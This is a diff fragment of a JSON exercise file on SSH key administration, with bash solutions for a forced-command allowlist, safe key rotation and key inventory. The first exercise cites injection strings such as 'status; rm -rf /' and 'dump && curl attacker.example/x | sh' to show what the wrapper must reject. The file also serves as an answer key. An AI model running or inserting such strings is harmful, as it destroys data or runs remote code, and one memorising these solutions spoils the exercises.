+          "output": "ok 2026-08-11T05:22:41Z",
+          "explanation": "SSH_ORIGINAL_COMMAND is exactly 'status', which matches an allowlist entry. The verb is never executed as text; it selects a branch."
+        },
+        {
+          "input": "ssh -i ~/.ssh/id_backup root@160.187.1.208 'status; rm -rf /'",
+          "output": "DENIED: status; rm -rf /   (on stderr)\n$? = 77",
+          "explanation": "Exact matching means the whole string has to equal 'status'. A wrapper using a case pattern like status*) or passing the variable to a shell would have run both halves."
+        },
+        {
+          "input": "ssh -i ~/.ssh/id_backup root@160.187.1.208",
+          "output": "DENIED:    (on stderr)\n$? = 77",
+          "explanation": "Asking for an interactive shell leaves SSH_ORIGINAL_COMMAND unset. Defaulting to a shell here would undo the entire point; the unset case must be denied like any other unknown request."
+        }
+      ],
+      "hintsJson": [
+        "Read the variable with a default so an unset value does not abort under set -u: `req=${SSH_ORIGINAL_COMMAND:-}`.",
+        "Use `case \"$req\" in dump) ...;; list) ...;; status) ...;; *) deny;; esac`. Note there is no glob in those patterns — 'dump)' matches only the exact string, while 'dump*)' would match 'dump; curl evil.sh | sh'.",
+        "The client IP is the first field of SSH_CONNECTION: `set -- $SSH_CONNECTION; ip=$1`, or `ip=${SSH_CONNECTION%% *}`.",
+        "Write the log before branching so denied attempts are recorded too, and use `>>` with a date from `date -u +%FT%TZ`. A security log that only records successes is not a security log."
+      ],
+      "starterCodeJson": [
+        {
+          "name": "backup-only.sh",
+          "language": "bash",
+          "code": "#!/usr/bin/env bash\n# Muc tieu cua mot dong command= trong authorized_keys.\n#\n# Dong cai dat (LUU Y co restrict — chi command= thi VAN cho mo duong ham):\n#   restrict,command=\"/usr/local/bin/backup-only.sh\" ssh-ed25519 AAAA... backup-puller\n#\nset -uo pipefail\n\n# TODO 1: doc yeu cau cua client. Bien nay do KE GOI dieu khien hoan toan.\n#         req=${SSH_ORIGINAL_COMMAND:-}\n\n# TODO 2: ghi log TRUOC khi re nhanh, de ca cac lan bi tu choi deu duoc ghi.\n#         Dinh dang: <ngay ISO> <ip client> <verdict> <yeu cau>\n#         IP client la truong dau cua $SSH_CONNECTION.\n\n# TODO 3: doi chieu voi DANH SACH CHO PHEP bang so sanh BANG NHAU TUYET DOI.\n#         KHONG eval. KHONG sh -c \"$req\". KHONG noi chuoi.\n#         Chu y: mau `dump)` khac han `dump*)`.\n\n# TODO 4: khong khop -> DENIED ra stderr, thoat 77.\n"
+        }
+      ],
+      "solutionCodeJson": [
+        {
+          "name": "backup-only.sh",
+          "language": "bash",
+          "code": "#!/usr/bin/env bash\n# Muc tieu cua mot dong command= trong authorized_keys.\n#\n# Dong cai dat (LUU Y co restrict — chi command= thi VAN cho mo duong ham):\n#   restrict,command=\"/usr/local/bin/backup-only.sh\" ssh-ed25519 AAAA... backup-puller\n#\nset -uo pipefail\n\nLOG=/var/log/backup-key.log\n\n# 1) Yeu cau cua client. Coi day la du lieu THU DICH: no di thang tu\n#    dong lenh cua nguoi goi vao bien nay, khong qua bo loc nao.\nreq=${SSH_ORIGINAL_COMMAND:-}\nip=${SSH_CONNECTION%% *}          # truong dau tien = IP cua client\nip=${ip:-unknown}\n\nlog() {\n  # Ghi CA lan bi tu choi. Mot cuon nhat ky chi ghi thanh cong thi khong\n  # phai nhat ky an ninh — thu ban can doc lai chinh la cac lan that bai.\n  printf '%s %s %s %s\\n' \"$(date -u +%FT%TZ)\" \"$ip\" \"$1\" \"$req\" >> \"$LOG\" 2>/dev/null || true\n}\n\ndeny() {\n  log DENIED\n  echo \"DENIED: $req\" >&2\n  exit 77\n}\n\n# 2) Danh sach cho phep. Cac mau duoi day KHONG co ky tu dai dien:\n#    `dump)` khop DUNG chuoi \"dump\" va khong khop gi khac.\n#    Viet `dump*)` la mo cua cho \"dump; curl ke-xau.sh | sh\".\n#    Chuoi cua client KHONG BAO GIO duoc chay nhu ma lenh — no chi duoc\n#    dung de CHON NHANH. Do la khac biet giua danh sach cho phep va\n#    mot cai vo boc chi lam ra ve an toan.\ncase \"$req\" in\n  dump)\n    log ALLOW\n    exec docker exec cuonghoangdev_postgres \\\n         pg_dump -U postgres cuonghoangdev_db\n    ;;\n  list)\n    log ALLOW\n    # -1 va -- : ten file bat dau bang dau gach cung khong bi doc thanh co\n    ls -1 -- /opt/backups\n    exit 0\n    ;;\n  status)\n    log ALLOW\n    echo \"ok $(date -u +%FT%TZ)\"\n    exit 0\n    ;;\n  *)\n    deny\n    ;;\nesac\n"
+        }
+      ],
+      "solutionExplanationHtml": "<p><strong>The variable selects a branch; it is never executed.</strong> That single sentence is the security property. Every broken forced-command wrapper violates it in one of three ways: <code>eval \"$SSH_ORIGINAL_COMMAND\"</code>, <code>sh -c \"$SSH_ORIGINAL_COMMAND\"</code>, or interpolating it into another command such as <code>pg_dump $SSH_ORIGINAL_COMMAND</code>. All three hand arbitrary execution to whoever holds the key, which means the <code>command=</code> option bought nothing at all.</p><p><strong><code>dump)</code> versus <code>dump*)</code> is the whole difference between an allowlist and decoration.</strong> The glob form matches <code>dump; rm -rf /</code>, <code>dump &amp;&amp; curl attacker.example/x | sh</code> and <code>dump --file=/etc/shadow</code>. Since the branch body would then run with the attacker's suffix still in the variable, any later use of it executes their text. Exact equality is not a stylistic preference here; it is what makes the set of reachable behaviours finite and enumerable.</p><p><strong>Denying the empty request matters more than it looks.</strong> Asking for an interactive shell leaves <code>SSH_ORIGINAL_COMMAND</code> unset, and a wrapper that treats &quot;no request&quot; as &quot;give them a shell&quot; has inverted its own purpose — the most privileged outcome reachable through the least specific input. <code>${SSH_ORIGINAL_COMMAND:-}</code> supplies an empty default so <code>set -u</code> does not abort, and the empty string then falls through to <code>*)</code> like any other unknown verb.</p><p><strong><code>restrict</code> in the installation line is not redundant.</strong> A <code>command=</code> entry constrains what runs when a session opens; it does nothing about port forwarding. Without <code>restrict</code>, the holder of this key can run <code>ssh -L 5432:localhost:5432 host</code> and reach Postgres directly, bypassing the wrapper entirely. The forced command guards one door while the tunnel walks around the building.</p><p>Logging before branching is the operational half. Accepted requests are the boring ones; the log line you will actually want six months from now is the denied attempt from an address you do not recognise, and a wrapper that logs only successes cannot produce it. The <code>|| true</code> on the log write keeps a full disk or a permissions problem from turning a working backup key into a broken one.</p>",
+      "diagramMermaid": "flowchart TD\n  A[Client gui mot chuoi bat ky] --> B[sshd bo qua no va chay command=]\n  B --> C[Script doc SSH_ORIGINAL_COMMAND]\n  C --> D[Ghi log truoc khi re nhanh]\n  D --> E{So BANG NHAU TUYET DOI voi danh sach cho phep}\n  E -->|dump| F[Chay pg_dump]\n  E -->|list| G[Liet ke thu muc sao luu]\n  E -->|status| H[In ok va gio UTC]\n  E -->|Moi thu khac| I[DENIED thoat 77]",
+      "referenceUrl": "https://man.openbsd.org/sshd.8#AUTHORIZED_KEYS_FILE_FORMAT"
+    },
+    {
+      "title": "Rotate a Key Without Locking Yourself Out",
+      "difficulty": "MEDIUM",
+      "estimatedMinutes": 50,
+      "points": 25,
+      "concepts": [
+        "key rotation",
+        "overlap windows",
+        "verify-before-remove",
+        "safe ordering"
+      ],
+      "prerequisites": [
+        "installing keys",
+        "verifying a login"
+      ],
+      "tags": [
+        "ssh",
+        "keys",
+        "operations",
+        "bash"
+      ],
+      "problemHtml": "<p>Rotating a key means replacing an old one with a new one on every server that trusts it. Done in the wrong order it is the single most reliable way to lock yourself out of a machine you administer: remove the old key, discover the new one does not work, and now have no way in to fix it.</p><p>The safe order is not complicated, and it is worth writing down as code because under time pressure people do it backwards.</p><p>Write <code>rotate-key.sh OLD_PUB NEW_PUB HOST</code>:</p><ol><li>Confirm the <strong>old</strong> key currently works. If it does not, stop with <code>ABORT old key does not work — fix access first</code> and exit <code>1</code>. Rotating from a broken state produces a machine nobody can reach.</li><li>Install the <strong>new</strong> key alongside the old one, appending, and idempotently.</li><li>Verify the <strong>new</strong> key works on a fresh connection. If it does not, leave the old key in place, print <code>ABORT new key does not work — old key left intact</code> and exit <code>2</code>. This is the step that makes the whole operation reversible.</li><li>Only now remove the <strong>old</strong> key, matching on its base64 field.</li><li>Verify one final time that the new key still works and the old one no longer does. Print <code>ROTATED old=&lt;fp&gt; new=&lt;fp&gt;</code> and exit <code>0</code>.</li><li>If the final check finds the old key still working, print <code>WARN old key still accepted</code> to stderr and exit <code>3</code> — usually it was installed for a second user as well.</li></ol><p>Every mutating step must be preceded by a check whose failure leaves the system in a working state. Write the removal with <code>grep -vF</code> into a temporary file and move it into place, so a failure part-way cannot truncate <code>authorized_keys</code>.</p>",
+      "inputSpec": "argv[1] and argv[2] are paths to the old and new .pub files; the matching private keys must sit alongside them without the .pub suffix. argv[3] is the SSH destination.",
+      "outputSpec": "'ROTATED old=SHA256:<fp> new=SHA256:<fp>' on success (exit 0); one of the ABORT lines (exit 1 or 2); or 'WARN old key still accepted' on stderr (exit 3).",
+      "constraints": "Never remove the old key before the new one has been proved to work. The removal must be atomic — build the new file then move it, never edit in place. Match keys by base64 field. All verification connections must use BatchMode=yes and PreferredAuthentications=publickey.",
+      "examplesJson": [
+        {
+          "input": "./rotate-key.sh ~/.ssh/id_old.pub ~/.ssh/id_new.pub cuong@may",
+          "output": "ROTATED old=SHA256:KzVxL+hH6wBL5CpzpKUgAM4s/3f82vOcbhnfqUuvTz8 new=SHA256:sud5pPJCvtp/A+nmJYoK5Br9ENA6Jf5ontU4k/IN+s0",
+          "explanation": "Old key verified, new key installed and verified, old key removed, final state confirmed. At no point was the machine reachable by neither key."
+        },
+        {
+          "input": "./rotate-key.sh ~/.ssh/id_old.pub ~/.ssh/id_new.pub cuong@may   # new private key has a passphrase",
+          "output": "ABORT new key does not work — old key left intact\n$? = 2",
+          "explanation": "The new key is installed but unusable under BatchMode, exactly as in the key-doctor exercise. Because verification precedes removal, access via the old key is untouched and the situation is fully recoverable."
+        },
+        {
+          "input": "./rotate-key.sh ~/.ssh/id_old.pub ~/.ssh/id_new.pub cuong@may   # old key was never installed",
+          "output": "ABORT old key does not work — fix access first\n$? = 1",
+          "explanation": "Stopping here prevents the worst outcome. Continuing would install a new key with no working fallback, and if that key also failed the machine would be unreachable."
+        }
+      ],
+      "hintsJson": [
+        "Write one `works()` helper taking a private key path and returning success or failure, then call it three times. Duplicating the ssh invocation invites the flags to drift apart between checks.",
+        "For the removal, build the file with `grep -vF -- \"$OLD_B64\" ~/.ssh/authorized_keys > tmp && mv tmp ~/.ssh/authorized_keys`. Editing in place risks truncation if anything fails mid-write.",
+        "Preserve the mode: create the temp file in the same directory and chmod 600 before the mv, so the result is never briefly world-readable.",
+        "For the final negative check, remember an old key that still works usually means it is installed for another user too, or a second authorized_keys file (authorized_keys2) is in play — report it rather than silently trying harder."
+      ],
+      "starterCodeJson": [
+        {
+          "name": "rotate-key.sh",
+          "language": "bash",
+          "code": "#!/usr/bin/env bash\n# Doi khoa theo THU TU AN TOAN. Lam nguoc thu tu la tu khoa minh o ngoai.\nset -uo pipefail\n\nOLD_PUB=${1:?usage: rotate-key.sh OLD_PUB NEW_PUB HOST}\nNEW_PUB=${2:?usage: rotate-key.sh OLD_PUB NEW_PUB HOST}\nHOST=${3:?usage: rotate-key.sh OLD_PUB NEW_PUB HOST}\n\n# TODO 0: viet MOT ham works() nhan duong dan khoa rieng, tra ve\n#         thanh cong/that bai. Goi no ba lan thay vi chep lai lenh ssh.\n\n# TODO 1: khoa CU phai dang hoat dong. Khong -> ABORT, thoat 1.\n\n# TODO 2: cai khoa MOI (noi them, khong trung lap).\n\n# TODO 3: khoa MOI phai hoat dong. Khong -> ABORT, GIU NGUYEN khoa cu,\n#         thoat 2. Day la buoc lam cho ca thao tac co the lui lai duoc.\n\n# TODO 4: GIO moi go khoa cu. Dung grep -vF ra file tam roi mv —\n#         dung sua truc tiep tai cho.\n\n# TODO 5: kiem lan cuoi: moi chay duoc, cu KHONG con chay.\n"
+        }
+      ],
+      "solutionCodeJson": [
+        {
+          "name": "rotate-key.sh",
+          "language": "bash",
+          "code": "#!/usr/bin/env bash\n# Doi khoa theo THU TU AN TOAN. Lam nguoc thu tu la tu khoa minh o ngoai.\nset -uo pipefail\n\nOLD_PUB=${1:?usage: rotate-key.sh OLD_PUB NEW_PUB HOST}\nNEW_PUB=${2:?usage: rotate-key.sh OLD_PUB NEW_PUB HOST}\nHOST=${3:?usage: rotate-key.sh OLD_PUB NEW_PUB HOST}\n\nOLD_PRIV=${OLD_PUB%.pub}\nNEW_PRIV=${NEW_PUB%.pub}\nOLD_B64=$(awk '{print $2}' \"$OLD_PUB\")\nNEW_LINE=$(head -1 \"$NEW_PUB\")\nNEW_B64=$(awk '{print $2}' \"$NEW_PUB\")\nOLD_FP=$(ssh-keygen -lf \"$OLD_PUB\" | awk '{print $2}')\nNEW_FP=$(ssh-keygen -lf \"$NEW_PUB\" | awk '{print $2}')\n\n# Mot ham duy nhat cho ca ba lan kiem. Chep lai lenh ssh ba cho la ba co\n# hoi de cac tham so troi khoi nhau — va mot phep kiem dung tham so khac\n# voi phep kiem kia thi khong con so sanh duoc voi nhau nua.\nworks() {\n  ssh -o BatchMode=yes \\\n      -o PreferredAuthentications=publickey \\\n      -o IdentitiesOnly=yes \\\n      -o ConnectTimeout=10 \\\n      -i \"$1\" \"$HOST\" true 2>/dev/null\n}\n\n# ── 1) Khoa CU phai dang chay ───────────────────────────────────────\n# Doi khoa tu mot trang thai von da hong se tao ra mot may khong ai vao duoc.\nif ! works \"$OLD_PRIV\"; then\n  echo \"ABORT old key does not work — fix access first\"\n  exit 1\nfi\n\n# ── 2) Cai khoa MOI BEN CANH khoa cu ────────────────────────────────\n# Dung CHINH khoa cu de cai — ta vua chung minh no chay o buoc 1. Neu de\n# lenh nay tu tim thong tin dang nhap, no se quay ve hoi mat khau va\n# script treo giua chung mot thao tac doi khoa, dung trang thai te nhat.\nssh -o BatchMode=yes -o IdentitiesOnly=yes -i \"$OLD_PRIV\" \\\n    \"$HOST\" \"LINE='$NEW_LINE' B64='$NEW_B64' bash -s\" <<'REMOTE' >/dev/null\n  set -euo pipefail\n  mkdir -p ~/.ssh; chmod 700 ~/.ssh; touch ~/.ssh/authorized_keys\n  grep -qF -- \"$B64\" ~/.ssh/authorized_keys || printf '%s\\n' \"$LINE\" >> ~/.ssh/authorized_keys\n  chmod 600 ~/.ssh/authorized_keys\nREMOTE\n\n# ── 3) Khoa MOI phai chay — TRUOC khi go bat cu thu gi ──────────────\n# Day la buoc bien ca thao tac thanh co the lui lai duoc.\nif ! works \"$NEW_PRIV\"; then\n  echo \"ABORT new key does not work — old key left intact\"\n  exit 2\nfi\n\n# ── 4) Gio moi go khoa cu ───────────────────────────────────────────\n# Dung ra file tam roi mv: mv trong cung mot he thong tep la nguyen tu,\n# nen authorized_keys hoac la ban cu tron ven hoac la ban moi tron ven,\n# khong bao gio la mot file bi cat cut giua chung.\n# Buoc nay dung khoa MOI: no vua duoc chung minh o buoc 3, va dung no o\n# day con la mot lan xac nhan nua rang khoa moi that su lam viec duoc\n# TRUOC khi khoa cu bien mat.\nssh -o BatchMode=yes -o IdentitiesOnly=yes -i \"$NEW_PRIV\" \\\n    \"$HOST\" \"B64='$OLD_B64' bash -s\" <<'REMOTE' >/dev/null\n  set -euo pipefail\n  tmp=$(mktemp ~/.ssh/ak.XXXXXX)     # cung thu muc -> mv la nguyen tu\n  chmod 600 \"$tmp\"                   # dat quyen TRUOC khi no vao vi tri\n  grep -vF -- \"$B64\" ~/.ssh/authorized_keys > \"$tmp\" || true\n  mv \"$tmp\" ~/.ssh/authorized_keys\nREMOTE\n\n# ── 5) Kiem lan cuoi: moi con chay, cu phai KHONG con chay ──────────\nif ! works \"$NEW_PRIV\"; then\n  echo \"ABORT new key stopped working after removal\" >&2\n  exit 2\nfi\n\nif works \"$OLD_PRIV\"; then\n  # Thuong la khoa cu con duoc cai cho MOT NGUOI DUNG KHAC, hoac con\n  # nam trong authorized_keys2. Bao ra, dung im lang thu manh tay hon.\n  echo \"WARN old key still accepted\" >&2\n  exit 3\nfi\n\necho \"ROTATED old=$OLD_FP new=$NEW_FP\"\nexit 0\n"
+        }
+      ],
+      "solutionExplanationHtml": "<p><strong>The ordering is the entire exercise.</strong> Check old, add new, verify new, remove old, verify both. Every mutation is preceded by a check whose failure leaves a working state behind, which means there is no point in the sequence where a failure produces an unreachable machine. Doing it in the natural-sounding order — remove the old key first, then install the new one — creates a window in which the only access is the connection you happen to be sitting in, and if the new key turns out to be passphrase-protected (the previous exercise) that window never closes.</p><p><strong>Step 1 exists to prevent a subtler disaster.</strong> If the old key is already not working, rotating from that state installs a new key with no verified fallback. Should the new key also fail, the machine has no working key at all — and the operator does not find out until the current session ends. Refusing to start is the correct behaviour, even though it feels obstructive when you are in a hurry.</p><p><strong>Atomic removal.</strong> <code>grep -vF</code> into a temp file followed by <code>mv</code> means <code>authorized_keys</code> is always either the complete old version or the complete new one. Editing in place — with <code>sed -i</code>, or a redirect into the same file — can leave a truncated file if the disk fills or the connection drops mid-write, and a truncated <code>authorized_keys</code> is an immediate lockout. The temp file is created in <code>~/.ssh</code> rather than <code>/tmp</code> so that <code>mv</code> stays within one filesystem and therefore stays atomic; <code>chmod 600</code> happens before the <code>mv</code>, so there is never an instant where the live file is more permissive than it should be.</p><p><strong>The final negative check is not paranoia.</strong> An old key that still works after removal almost always means it was installed in more than one place: a second user's <code>authorized_keys</code>, or the <code>authorized_keys2</code> file that this server's config still lists (visible in <code>sshd -T</code> output as <code>authorizedkeysfile .ssh/authorized_keys .ssh/authorized_keys2</code>). Reporting that as a warning rather than quietly searching harder keeps the tool predictable — it did what it was asked, and it is telling you the goal was not fully achieved.</p><p><code>works()</code> as a single helper called three times matters more than it appears. Three hand-written <code>ssh</code> invocations drift: one gains a <code>-p</code>, another loses <code>IdentitiesOnly</code>, and then the &quot;new key works&quot; check and the &quot;old key no longer works&quot; check are no longer measuring the same thing — which makes the final verdict meaningless in exactly the situation where you most need to trust it.</p>",
+      "diagramMermaid": "flowchart TD\n  A[Bat dau] --> B{Khoa cu co chay khong}\n  B -->|Khong| C[ABORT thoat 1 sua quyen truy cap truoc]\n  B -->|Co| D[Cai khoa moi BEN CANH khoa cu]\n  D --> E{Khoa moi co chay khong}\n  E -->|Khong| F[ABORT thoat 2 khoa cu van con nguyen]\n  E -->|Co| G[Go khoa cu bang grep -vF roi mv]\n  G --> H{Moi con chay va cu da tat}\n  H -->|Dung| I[ROTATED thoat 0]\n  H -->|Cu van chay| J[WARN thoat 3 co the con cho khac]",
+      "referenceUrl": "https://man.openbsd.org/sshd.8#AUTHORIZED_KEYS_FILE_FORMAT"
+    },
+    {
+      "title": "Build a Key Inventory Across Several Servers",
+      "difficulty": "HARD",
+      "estimatedMinutes": 60,
+      "points": 25,
+      "concepts": [
+        "fleet auditing",
+        "fingerprint as identity",
+        "orphan detection",
+        "partial failure reporting"
+      ],
+      "prerequisites": [
+        "fingerprint comparison",
+        "reading remote files"
+      ],
+      "tags": [
+        "ssh",
+        "audit",
+        "operations",
+        "bash"
+      ],
+      "problemHtml": "<p>After a year, nobody knows which keys are on which servers. Someone left the team six months ago; is their key still installed anywhere? A laptop was stolen; which machines does it still open? These questions are unanswerable by memory and trivially answerable by a script, because a fingerprint is a stable identity for a key regardless of what comment it carries or which file it lives in.</p><p>Write <code>key-inventory.sh HOSTFILE KNOWNFILE</code>:</p><ul><li><code>HOSTFILE</code> lists SSH destinations, one per line, with <code>#</code> comments allowed.</li><li><code>KNOWNFILE</code> maps fingerprints to owners: <code>SHA256:… alice-laptop</code>, one per line.</li><li>For each host, read <code>~/.ssh/authorized_keys</code> and fingerprint every key.</li><li>Print <code>&lt;host&gt; &lt;fingerprint&gt; &lt;owner-or-UNKNOWN&gt;</code> for each key found.</li><li>A host that cannot be reached must not stop the run: print <code>&lt;host&gt; UNREACHABLE</code> and continue. A fleet audit that dies on the first offline machine is useless precisely when a machine is offline.</li><li>Finish with three summary sections: <code>ORPHAN &lt;fp&gt; on &lt;n&gt; host(s)</code> for every fingerprint not in <code>KNOWNFILE</code>; <code>MISSING &lt;owner&gt;</code> for every known owner found on no host; and <code>UNREACHABLE &lt;n&gt; host(s)</code>.</li><li>Exit <code>1</code> if any orphan was found, otherwise <code>0</code>.</li></ul><p>Report the unreachable count in the summary even when it is zero. A number that is always present is read; a line that appears only sometimes is missed — and &quot;no orphans found&quot; means something very different when four hosts were never contacted.</p>",
+      "inputSpec": "argv[1] is a file of SSH destinations, one per line, # comments allowed. argv[2] is a file of 'SHA256:<fp> <owner>' lines. Both may contain blank lines.",
+      "outputSpec": "One '<host> <fp> <owner|UNKNOWN>' line per key, plus '<host> UNREACHABLE' lines, then ORPHAN / MISSING / UNREACHABLE summary lines. Exit 1 when any orphan exists, else 0.",
+      "constraints": "One unreachable host must never abort the run. Use BatchMode=yes and a connect timeout so an offline host fails quickly. Fingerprints are the identity — never match on comments, which are freely editable and frequently wrong. Count each fingerprint once per host even if it appears twice in a file.",
+      "examplesJson": [
+        {
+          "input": "hosts.txt:\ncuong@may1\ncuong@may2\n\nknown.txt:\nSHA256:KzVxL+hH6wBL5CpzpKUgAM4s/3f82vOcbhnfqUuvTz8 cuong-macbook\nSHA256:sud5pPJCvtp/A+nmJYoK5Br9ENA6Jf5ontU4k/IN+s0 backup-puller",
+          "output": "cuong@may1 SHA256:KzVxL+hH6wBL5CpzpKUgAM4s/3f82vOcbhnfqUuvTz8 cuong-macbook\ncuong@may1 SHA256:sud5pPJCvtp/A+nmJYoK5Br9ENA6Jf5ontU4k/IN+s0 backup-puller\ncuong@may2 SHA256:KzVxL+hH6wBL5CpzpKUgAM4s/3f82vOcbhnfqUuvTz8 cuong-macbook\nUNREACHABLE 0 host(s)",
+          "explanation": "Everything found is accounted for, so there are no ORPHAN or MISSING lines. Exit 0. The zero-unreachable line still prints, so the reader knows the audit was complete."
+        },
+        {
+          "input": "same files, but may2 also carries an unrecognised key",
+          "output": "cuong@may2 SHA256:iiEpJaEz7bmBFRw/+yo9mf6qZkPAur/lFgZ+UDSzzes UNKNOWN\nORPHAN SHA256:iiEpJaEz7bmBFRw/+yo9mf6qZkPAur/lFgZ+UDSzzes on 1 host(s)\nUNREACHABLE 0 host(s)",
+          "explanation": "Exit 1. An orphan is a key that opens a production server and belongs to nobody on record — the single most valuable thing this report produces."
+        },
+        {
+          "input": "may2 is powered off",
+          "output": "cuong@may2 UNREACHABLE\nMISSING backup-puller\nUNREACHABLE 1 host(s)",
+          "explanation": "The run continues past the dead host. Note the MISSING line is now suspect: backup-puller may well be installed on may2 and simply not seen. The unreachable count is what tells the reader to distrust that conclusion."
+        }
+      ],
+      "hintsJson": [
+        "Accumulate into three parallel structures: a set of seen fingerprints, a count of hosts per fingerprint, and a set of owners actually found. In bash 3.2 there are no associative arrays — use newline-delimited strings and grep, or a temp file per structure.",
+        "Wrap the per-host ssh in an if so a failure is handled rather than fatal — and pass `-n`: `if out=$(ssh -n -o BatchMode=yes -o ConnectTimeout=10 \"$h\" 'cat ~/.ssh/authorized_keys 2>/dev/null'); then ... else echo \"$h UNREACHABLE\"; fi`. Without -n, ssh reads the same stdin the while-loop is reading the host list from, swallows the remaining hosts on the first iteration, and the audit silently covers exactly one machine.",
+        "Deduplicate per host before counting, otherwise a file containing the same key twice inflates the host count for that fingerprint and the ORPHAN line reports a number that does not correspond to machines.",
+        "Compute MISSING by subtracting the set of owners found from the set in KNOWNFILE — `comm -13` on two sorted lists does it in one step."
+      ],
+      "starterCodeJson": [
+        {
+          "name": "key-inventory.sh",
+          "language": "bash",
+          "code": "#!/usr/bin/env bash\n# Khoa nao dang nam tren may nao? Dau van tay la danh tinh, chu thich thi khong.\nset -uo pipefail\n\nHOSTFILE=${1:?usage: key-inventory.sh HOSTFILE KNOWNFILE}\nKNOWNFILE=${2:?usage: key-inventory.sh HOSTFILE KNOWNFILE}\n\n# TODO 0: bash 3.2 KHONG co mang lien ket. Dung file tam / chuoi nhieu dong\n#         + grep de gom du lieu.\n\n# TODO 1: voi moi host trong HOSTFILE (bo dong trong va dong #):\n#         doc authorized_keys, bam dau van tay tung dong.\n#         KHONG toi duoc -> in \"<host> UNREACHABLE\" va DI TIEP.\n#         Mot con may tat dien khong duoc phep giet ca cuoc kiem ke.\n\n# TODO 2: tra chu so huu tu KNOWNFILE, khong co -> UNKNOWN.\n\n# TODO 3: tong ket ORPHAN / MISSING / UNREACHABLE.\n#         In dong UNREACHABLE KE CA khi bang 0 — \"khong co khoa la\"\n#         mang y nghia rat khac neu bon may chua he duoc hoi toi.\n"
+        }
+      ],
+      "solutionCodeJson": [
+        {
+          "name": "key-inventory.sh",
+          "language": "bash",
+          "code": "#!/usr/bin/env bash\n# Khoa nao dang nam tren may nao? Dau van tay la danh tinh, chu thich thi khong.\nset -uo pipefail\n\nHOSTFILE=${1:?usage: key-inventory.sh HOSTFILE KNOWNFILE}\nKNOWNFILE=${2:?usage: key-inventory.sh HOSTFILE KNOWNFILE}\n[ -r \"$HOSTFILE\" ]  || { echo \"khong doc duoc $HOSTFILE\" >&2;  exit 1; }\n[ -r \"$KNOWNFILE\" ] || { echo \"khong doc duoc $KNOWNFILE\" >&2; exit 1; }\n\nwork=$(mktemp -d)\ncleanup() { rm -rf \"$work\" 2>/dev/null; return 0; }\ntrap cleanup EXIT\n\nline=\"$work/line\"; seen=\"$work/seen\"; owners=\"$work/owners\"\n: > \"$seen\"; : > \"$owners\"\nunreachable=0\n\nowner_of() {\n  # Tra ve chu so huu ung voi dau van tay, hoac rong.\n  awk -v fp=\"$1\" '$1 == fp { $1=\"\"; sub(/^ /,\"\"); print; exit }' \"$KNOWNFILE\"\n}\n\nwhile IFS= read -r host || [ -n \"$host\" ]; do\n  [ -z \"${host// /}\" ] && continue\n  case \"${host#\"${host%%[! ]*}\"}\" in \\#*) continue ;; esac\n\n  # Mot may tat dien KHONG duoc phep giet ca cuoc kiem ke — dung luc\n  # co may chet moi la luc ban can bao cao nay nhat.\n  # -n LA BAT BUOC. Vong lap nay dang doc HOSTFILE tren stdin, va ssh cung\n  # doc stdin — no se hut sach phan con lai cua danh sach host ngay o lan\n  # lap dau tien, nen may thu hai tro di khong bao gio duoc kiem. Trieu\n  # chung: bao cao chay xong, khong bao loi, va chi co dung MOT host trong\n  # ket qua. -n noi stdin cua ssh vao /dev/null.\n  if ! remote=$(ssh -n -o BatchMode=yes -o ConnectTimeout=10 \"$host\" \\\n                'cat ~/.ssh/authorized_keys 2>/dev/null' 2>/dev/null); then\n    echo \"$host UNREACHABLE\"\n    unreachable=$((unreachable + 1))\n    continue\n  fi\n\n  # Gom dau van tay cua RIENG host nay, roi loc trung TRUOC khi dem.\n  # Mot file co cung mot khoa hai lan khong co nghia la hai cai may.\n  hostfps=\"$work/hostfps\"; : > \"$hostfps\"\n  while IFS= read -r l || [ -n \"$l\" ]; do\n    [ -z \"${l// /}\" ] && continue\n    case \"${l#\"${l%%[! ]*}\"}\" in \\#*) continue ;; esac\n    idx=0; keyidx=0\n    for field in $l; do\n      idx=$((idx + 1))\n      case \"$field\" in ssh-*|ecdsa-*|sk-*) keyidx=$idx; break ;; esac\n    done\n    [ \"$keyidx\" -eq 0 ] && continue\n    printf '%s\\n' \"$l\" | cut -d' ' -f\"$keyidx\"- > \"$line\"\n    fp=$(ssh-keygen -lf \"$line\" 2>/dev/null | awk '{print $2}') || continue\n    [ -n \"$fp\" ] && echo \"$fp\" >> \"$hostfps\"\n  done <<EOF\n$remote\nEOF\n\n  sort -u \"$hostfps\" > \"$hostfps.u\"\n  while IFS= read -r fp; do\n    [ -z \"$fp\" ] && continue\n    who=$(owner_of \"$fp\")\n    if [ -n \"$who\" ]; then\n      echo \"$host $fp $who\"\n      echo \"$who\" >> \"$owners\"\n    else\n      echo \"$host $fp UNKNOWN\"\n    fi\n    echo \"$fp\" >> \"$seen\"      # mot dong moi HOST -> dem duoc so may\n  done < \"$hostfps.u\"\ndone < \"$HOSTFILE\"\n\n# ── Tong ket ────────────────────────────────────────────────────────\norphan_found=0\n# Dung THAY THE TIEN TRINH `< <(...)` chu KHONG dung ong.\n# Hai ly do, ca hai deu tung lam script nay bao sai:\n#  1) `... | while ...` chay than vong lap trong SUBSHELL, nen bien\n#     orphan_found dat ben trong se bien mat khi ong ket thuc.\n#  2) Cach chua quen thuoc `... | grep -q x` cung sai khi dang bat\n#     `pipefail`: grep -q thoat NGAY khi tim thay, dong ong lai, cac tang\n#     truoc an SIGPIPE va tra ve khac 0, nen CA pipeline thanh that bai\n#     dung vao luc no vua tim THAY thu can tim.\n# Ket qua cua ca hai lo nay giong het nhau: bao cao in ra dung, ma ma\n# thoat luon la 0 — mot cai cong bao mat khong bao gio dong.\nwhile read -r count fp; do\n  [ -z \"$fp\" ] && continue\n  if [ -z \"$(owner_of \"$fp\")\" ]; then\n    echo \"ORPHAN $fp on $count host(s)\"\n    orphan_found=1\n  fi\ndone < <(sort \"$seen\" | uniq -c)\n\n# MISSING: chu so huu co trong danh sach ma khong thay o dau ca.\nawk 'NF { $1=\"\"; sub(/^ /,\"\"); print }' \"$KNOWNFILE\" | sort -u > \"$work/all_owners\"\nsort -u \"$owners\" > \"$work/found_owners\"\ncomm -13 \"$work/found_owners\" \"$work/all_owners\" | while read -r o; do\n  [ -n \"$o\" ] && echo \"MISSING $o\"\ndone\n\n# In KE CA khi bang 0: \"khong co khoa la\" mang y nghia khac han neu\n# bon con may chua he duoc hoi toi.\necho \"UNREACHABLE $unreachable host(s)\"\n\n[ \"$orphan_found\" -eq 1 ] && exit 1\nexit 0\n"
+        }
+      ],
